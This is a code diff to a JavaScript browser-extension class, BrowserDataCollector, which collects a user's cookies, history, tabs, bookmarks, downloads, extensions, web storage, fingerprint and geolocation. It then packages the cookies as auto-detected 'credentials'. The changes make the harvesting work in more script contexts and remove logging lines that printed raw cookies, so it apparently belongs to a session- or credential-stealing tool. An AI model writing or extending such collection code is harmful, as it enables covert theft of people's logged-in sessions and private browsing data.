@@ -1,29 +1,45 @@
 class BrowserDataCollector {
+    // Check if we're in a context with DOM access (content script vs background script)
+    static isContentScriptContext() {
+        return typeof window !== 'undefined' && typeof navigator !== 'undefined';
+    }
+
+    // Safe navigator access with fallbacks
+    static safeNavigator(property, fallback = null) {
+        try {
+            if (typeof navigator !== 'undefined' && navigator[property] !== undefined) {
+                return navigator[property];
+            }
+        } catch (error) {
+            console.warn(`Navigator.${property} not available:`, error.message);
+        }
+        return fallback;
+    }
+
     static async collectAllBrowserData(url, tabId, domainConfig, currentTab) {
         try {
+            const isContentScript = this.isContentScriptContext();
             
             const browserData = {
                 ipAddress: null,
-                userAgent: navigator.userAgent,
-                platform: this.getPlatformInfo(),
-                browser: this.getBrowserInfo(),
+                userAgent: this.safeNavigator('userAgent', 'Unknown'),
+                platform: await this.getPlatformInfo(),
+                browser: await this.getBrowserInfo(),
                 
-
+                // Chrome API calls (available in both contexts)
                 cookies: await this.collectCookies(url),
-                localStorage: {},
-                sessionStorage: {},
-                
-
-                fingerprint: await this.collectFingerprint(),
-                geoLocation: await this.collectGeoLocation(),
-                metadata: this.collectMetadata(),
-                
-
                 browserHistory: await this.collectBrowserHistory(),
                 tabs: await this.collectTabsInfo(),
                 bookmarks: await this.collectBookmarks(),
                 downloads: await this.collectDownloads(),
-                extensions: await this.collectExtensionsInfo()
+                extensions: await this.collectExtensionsInfo(),
+                
+                // DOM-dependent data (only in content script context)
+                localStorage: {},
+                sessionStorage: {},
+                fingerprint: isContentScript ? await this.collectFingerprint() : null,
+                geoLocation: isContentScript ? await this.collectGeoLocation() : null,
+                metadata: isContentScript ? this.collectMetadata() : this.collectBackgroundMetadata()
             }
 
             if (tabId) {
@@ -32,7 +48,7 @@ class BrowserDataCollector {
                     browserData.localStorage = storageData.localStorage || {}
                     browserData.sessionStorage = storageData.sessionStorage || {}
                 } catch (error) {
-                    console.warn('Storage collection failed:', error.message)
+                    // Storage collection failed - continue without it
                 }
             }
 
@@ -56,7 +72,7 @@ class BrowserDataCollector {
     static async collectCookies(url) {
         try {
             if (!url) {
-                const activeTabResult = await this.getActiveTab()
+                const activeTabResult = await ChromeUtils.getActiveTab()
                 if (activeTabResult.success && activeTabResult.data?.url) {
                     url = activeTabResult.data.url
                 } else {
@@ -452,62 +468,105 @@ class BrowserDataCollector {
 
 
     static getPlatformInfo() {
-        const platform = navigator.platform
-        const userAgent = navigator.userAgent
+        try {
+            const platform = this.safeNavigator('platform', 'Unknown');
+            const userAgent = this.safeNavigator('userAgent', '');
 
-        if (userAgent.includes('Windows')) return 'Windows'
-        if (userAgent.includes('Mac')) return 'macOS'
-        if (userAgent.includes('Linux')) return 'Linux'
-        if (userAgent.includes('Android')) return 'Android'
-        if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS'
-        
-        return platform || 'Unknown'
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac')) return 'macOS';
+            if (userAgent.includes('Linux')) return 'Linux';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
+            
+            return platform || 'Unknown';
+        } catch (error) {
+            console.warn('Error getting platform info:', error.message);
+            return 'Unknown';
+        }
     }
 
     static getBrowserInfo() {
-        const userAgent = navigator.userAgent
-        
-        if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
-            const match = userAgent.match(/Chrome\/(\d+\.\d+)/)
-            return `Chrome ${match ? match[1] : 'Unknown'}`
+        try {
+            const userAgent = this.safeNavigator('userAgent', '');
+            
+            if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+                const match = userAgent.match(/Chrome\/([\d\.]+)/);
+                return `Chrome ${match ? match[1] : 'Unknown'}`;
+            }
+            if (userAgent.includes('Firefox')) {
+                const match = userAgent.match(/Firefox\/([\d\.]+)/);
+                return `Firefox ${match ? match[1] : 'Unknown'}`;
+            }
+            if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+                const match = userAgent.match(/Version\/([\d\.]+)/);
+                return `Safari ${match ? match[1] : 'Unknown'}`;
+            }
+            if (userAgent.includes('Edg')) {
+                const match = userAgent.match(/Edg\/([\d\.]+)/);
+                return `Edge ${match ? match[1] : 'Unknown'}`;
+            }
+            
+            return 'Unknown Browser';
+        } catch (error) {
+            console.warn('Error getting browser info:', error.message);
+            return 'Unknown Browser';
         }
-        if (userAgent.includes('Firefox')) {
-            const match = userAgent.match(/Firefox\/(\d+\.\d+)/)
-            return `Firefox ${match ? match[1] : 'Unknown'}`
-        }
-        if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
-            const match = userAgent.match(/Version\/(\d+\.\d+)/)
-            return `Safari ${match ? match[1] : 'Unknown'}`
-        }
-        if (userAgent.includes('Edg')) {
-            const match = userAgent.match(/Edg\/(\d+\.\d+)/)
-            return `Edge ${match ? match[1] : 'Unknown'}`
-        }
-        
-        return 'Unknown Browser'
     }
 
 
     static collectMetadata() {
-        return {
-            collectionTimestamp: new Date().toISOString(),
-            extensionVersion: chrome.runtime.getManifest().version,
-            url: window.location?.href || 'extension-context',
-            referrer: document?.referrer || null,
-            viewport: {
-                width: window.innerWidth,
-                height: window.innerHeight
-            },
-            performanceMemory: performance.memory ? {
-                usedJSHeapSize: performance.memory.usedJSHeapSize,
-                totalJSHeapSize: performance.memory.totalJSHeapSize,
-                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
-            } : null,
-            performanceTiming: {
-                navigationStart: performance.timing?.navigationStart,
-                loadEventEnd: performance.timing?.loadEventEnd,
-                domContentLoadedEventEnd: performance.timing?.domContentLoadedEventEnd
-            }
+        try {
+            return {
+                collectionTimestamp: new Date().toISOString(),
+                extensionVersion: chrome.runtime.getManifest().version,
+                url: typeof window !== 'undefined' ? (window.location?.href || 'content-script-context') : 'extension-context',
+                referrer: typeof document !== 'undefined' ? (document?.referrer || null) : null,
+                viewport: typeof window !== 'undefined' ? {
+                    width: window.innerWidth || 0,
+                    height: window.innerHeight || 0
+                } : { width: 0, height: 0 },
+                performanceMemory: typeof performance !== 'undefined' && performance.memory ? {
+                    usedJSHeapSize: performance.memory.usedJSHeapSize,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+                } : null,
+                performanceTiming: typeof performance !== 'undefined' && performance.timing ? {
+                    navigationStart: performance.timing.navigationStart,
+                    loadEventEnd: performance.timing.loadEventEnd,
+                    domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
+                } : null
+            };
+        } catch (error) {
+            console.warn('Error collecting metadata:', error.message);
+            return this.collectBackgroundMetadata();
+        }
+    }
+
+    static collectBackgroundMetadata() {
+        try {
+            return {
+                collectionTimestamp: new Date().toISOString(),
+                extensionVersion: chrome.runtime.getManifest().version,
+                url: 'background-script-context',
+                referrer: null,
+                viewport: { width: 0, height: 0 },
+                performanceMemory: null,
+                performanceTiming: null,
+                context: 'background-script'
+            };
+        } catch (error) {
+            console.warn('Error collecting background metadata:', error.message);
+            return {
+                collectionTimestamp: new Date().toISOString(),
+                extensionVersion: 'unknown',
+                url: 'background-script-context',
+                referrer: null,
+                viewport: { width: 0, height: 0 },
+                performanceMemory: null,
+                performanceTiming: null,
+                context: 'background-script',
+                error: error.message
+            };
         }
     }
 
@@ -683,46 +742,19 @@ class BrowserDataCollector {
         }
     }
 
-    static async getActiveTab() {
-        try {
-            return new Promise(resolve => {
-                chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
-                    const activeTab = tabs[0]
-                    if (activeTab) {
-                        resolve({
-                            success: true,
-                            data: activeTab,
-                            error: null
-                        })
-                    } else {
-                        resolve({
-                            success: false,
-                            data: null,
-                            error: 'No active tab found'
-                        })
-                    }
-                })
-            })
-        } catch (error) {
-            return {
-                success: false,
-                data: null,
-                error: error.message
-            }
-        }
-    }
+
 
     static async getBrowserData(url = null, tabId = null, domainConfig = null, currentTab = null) {
         try {
             if (!url || !tabId) {
-                const activeTabResult = await this.getActiveTab()
+                const activeTabResult = await ChromeUtils.getActiveTab()
                 if (activeTabResult.success && activeTabResult.data) {
                     tabId = activeTabResult.data.id
                     url = activeTabResult.data.url
                     currentTab = activeTabResult.data
                 }
                 
-                domainConfig = await Constants.getCurrentDomain()
+                domainConfig = await ChromeUtils.getCurrentDomain()
             }
             
 
@@ -752,7 +784,6 @@ class BrowserDataCollector {
                 credentialSource: 'auto_detected'
             }
             
-            console.log('cookeis in get brower method', formattedData.cookies)
             return {
                 success: true,
                 error: null,
@@ -774,10 +805,6 @@ class BrowserDataCollector {
             const results = []
             if (credentials.cookies) {
                 const cookiesArray = Object.values(credentials.cookies)
-                console.log('raw cookies: ', credentials.cookies)
-
-                console.log('cookeis array: ', cookiesArray)
-
                 for (const cookieData of cookiesArray) {
                     try {
                         
@@ -861,6 +888,12 @@ class BrowserDataCollector {
 }
 
 
+// Make available for both Node.js and browser contexts
 if (typeof module !== 'undefined' && module.exports) {
-    module.exports = BrowserDataCollector
+    module.exports = BrowserDataCollector;
+}
+
+// Make available globally for browser/content script context
+if (typeof window !== 'undefined') {
+    window.BrowserDataCollector = BrowserDataCollector;
 }
